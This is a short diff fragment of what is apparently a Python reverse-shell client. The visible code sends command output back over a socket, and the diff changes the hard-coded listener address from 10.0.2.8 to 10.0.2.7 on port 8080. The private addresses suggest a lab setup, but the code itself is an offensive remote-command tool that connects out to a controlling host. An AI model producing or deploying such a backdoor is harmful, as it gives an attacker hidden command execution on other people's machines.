@@ -58,5 +58,5 @@ class MySocket:
 			self.send(command_output)
 		self.my_connection.close()
 
-my_socket = MySocket("10.0.2.8",8080)
+my_socket = MySocket("10.0.2.7",8080)
 my_socket.start_socket()
